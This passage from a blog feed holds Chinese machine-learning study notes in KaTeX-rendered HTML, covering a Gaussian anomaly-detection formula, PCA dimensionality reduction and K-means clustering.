style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.0652em;vertical-align:-1.4138em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6514em;\"><span style=\"top:-1.8723em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.05em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∏</span></span></span><span style=\"top:-4.3em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4138em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.2504em;vertical-align:-1.4138em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6514em;\"><span style=\"top:-1.8723em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.05em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∏</span></span></span><span style=\"top:-4.3em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4138em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3214em;\"><span style=\"top:-2.2028em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9072em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord\">2</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span><span style=\"top:-2.8672em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg xmlns=\"http://www.w3.org/2000/svg\" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1328em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0833em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8366em;\"><span style=\"top:-3.8367em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:3.0053em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mopen nulldelimiter sizing reset-size3 size6\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4361em;\"><span style=\"top:-2.4699em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9892em;\"><span style=\"top:-2.1488em;margin-left:-0.0359em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6595em;\"></span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span><span style=\"top:-3.0043em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6595em;\"></span><span class=\"mord mtight\">2</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7052em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.2255em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line mtight\" style=\"border-bottom-width:0.049em;\"></span></span><span style=\"top:-3.6872em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3448em;margin-left:0em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6595em;\"></span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5092em;\"><span></span></span></span></span></span></span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">μ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3448em;margin-left:0em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6595em;\"></span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5092em;\"><span></span></span></span></span></span></span><span class=\"mclose mtight\"><span class=\"mclose mtight\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0484em;\"><span style=\"top:-3.0484em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6444em;\"></span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0338em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter sizing reset-size3 size6\"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li>\n<p>判断 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>&lt;</mo><mi>ε</mi></mrow><annotation encoding=\"application/x-tex\">p(x_i)&lt;\\varepsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">ε</span></span></span></span> ？</p>\n</li>\n</ol>\n<h1 id=\"主成分分析\"><a class=\"anchor\" href=\"#主成分分析\">#</a> 主成分分析</h1>\n<p>（PCA） =&gt; <mark>降维</mark> =&gt; 高维向低维做<strong>投影</strong></p>\n<p><strong>目标</strong>：投影后，不同类别的数据之间 <strong>关联度</strong> 尽可能小<br />\n =&gt; 数据的方差最大（因为方差越大，数据越分散）</p>\n<p><strong>计算过程</strong>：</p>\n<ul>\n<li>原始数据预处理：<br />\n（标准化：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>μ</mi><mo>=</mo><mn>0</mn><mo separator=\"true\">,</mo><mi>σ</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">\\mu=0,\\sigma=1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">μ</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8389em;vertical-align:-0.1944em;\"></span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span>）</li>\n<li>计算协方差矩阵的特征向量、及数据在各特征向量投影后的方差</li>\n<li>根据需求（任务指定 或 方差比例）确定降维维度 k</li>\n<li>选取 k 维特征向量，计算数据在其形成空间的投影</li>\n</ul>\n",
            "tags": [
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E8%81%9A%E7%B1%BB/",
            "url": "https://www.sycamore.top/Graduation/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E8%81%9A%E7%B1%BB/",
            "title": "聚类",
            "date_published": "2024-01-23T01:18:18.000Z",
            "content_html": "<h1 id=\"无监督学习\"><a class=\"anchor\" href=\"#无监督学习\">#</a> 无监督学习</h1>\n<p>不给定<strong>带标记</strong>的训练示例，自动对输入的数据进行分类或分群。</p>\n<p><strong>优点</strong>：</p>\n<ol>\n<li>算法不受监督信息（偏见）的约束，可能考虑到新的信息</li>\n<li>不需要标签数据，极大程度扩大数据样本</li>\n</ol>\n<p><strong>主要应用</strong>：聚类分析、关联规则、维度缩减</p>\n<h1 id=\"聚类分析\"><a class=\"anchor\" href=\"#聚类分析\">#</a> 聚类分析</h1>\n<p>又称为群分析，<br />\n根据对象的某些属性的相似度，将其自动划分为不同的类别。<br />\n（<strong>分类</strong>问题）</p>\n<h2 id=\"k-means\"><a class=\"anchor\" href=\"#k-means\">#</a> K-means</h2>\n<p>K 均值聚类算法：以空间中 k 个点为中心进行聚类，最靠近它们的对象归为一类。</p>\n<p>核心步骤：<br />\n设 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 个点为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi>x</mi><mi>k</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_1,x_2,\\dots,x_k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个区域簇为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><msub><mi>u</mi><mi>m</mi></msub></mrow><annotation encoding=\"application/x-tex\">u_1,u_2,\\dots,u_m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><br />\n 中心点初始值为<strong>随机指定</strong>的未分类点</p>\n<ul>\n<li>根据数据与中心点的 <strong>距离</strong> 划分类别 =&gt; 对每个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 计算 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><msub><mi>u</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">dis(x_i,u_j)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0361em;vertical-align:-0.2861em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> ，将点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 划入离他最近的区域簇</li>\n<li><strong>更新</strong>中心点为 簇中点的均值 =&gt; <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>u</mi><mi>j</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>k</mi></mfrac><msub><mo>∑</mo><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>∈</mo><msub><mi>s</mi><mi>j</mi></msub></mrow></msub><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">u_j = \\frac1k\\sum_{x_i\\in s_j}(x_i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7167em;vertical-align:-0.2861em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">u</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.3421em;vertical-align:-0.497em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.0777em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2819em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.497em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 